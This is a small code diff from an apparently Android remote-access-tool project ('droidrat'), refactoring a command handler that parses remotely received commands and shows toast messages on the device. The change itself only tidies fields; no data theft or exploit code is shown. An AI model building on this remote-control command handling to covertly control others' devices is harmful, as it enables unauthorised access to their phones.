@@ -11,14 +11,9 @@ import static com.je_chen.droidrat_je.service.command.ProcessCommandService.webs
 
 public class ToastCommand extends CommandFather {
 
-    private final String TAG = "Toast Event ";
-
-    private Toastmaker toastmaker;
-
-    private Context context;
+    private final Toastmaker toastmaker;
 
     public ToastCommand(Context context) {
-        this.context = context;
         toastmaker = new Toastmaker(context);
     }
 
@@ -31,6 +26,7 @@ public class ToastCommand extends CommandFather {
     public void processCommand(String command) {
         try {
             String[] rawCommandArray = command.split(" ");
+            String TAG = "Toast Event ";
             switch (rawCommandArray[1]) {
                 case "ToastN":
                     String message = rawCommandArray[2];
